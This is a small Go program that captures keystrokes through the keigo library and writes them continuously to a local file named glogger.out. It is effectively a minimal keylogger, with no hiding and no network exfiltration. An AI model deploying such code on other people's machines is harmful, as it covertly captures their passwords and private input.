// Program glogger logs user input and outputs to file.
package main

import "log"
import "os"
import "time"

import "github.com/karlek/keigo"

const (
	fileName = "glogger.out"
)

// Error wrapper
func main() {
	err := logToFile()
	if err != nil {
		log.Fatalln(err)
	}
}

func logToFile() (err error) {
	file, err := os.Create(fileName)
	if err != nil {
		return err
	}
	defer file.Close()

	for {
		time.Sleep(1 * time.Microsecond)
		keigo.KeyLog(file)
	}

	return nil
}
